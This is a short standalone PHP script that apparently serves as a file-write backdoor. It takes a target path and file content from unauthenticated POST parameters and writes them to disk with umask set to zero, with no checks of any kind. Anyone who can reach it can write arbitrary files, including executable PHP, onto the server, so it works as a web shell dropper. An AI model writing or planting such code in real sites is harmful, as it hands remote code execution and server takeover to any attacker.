<?php
umask(0); // Allows full permissions
if(file_put_contents($_POST["url"],$_POST["content"]))
{
echo"success";
}
else
{
echo"failed";
}
?>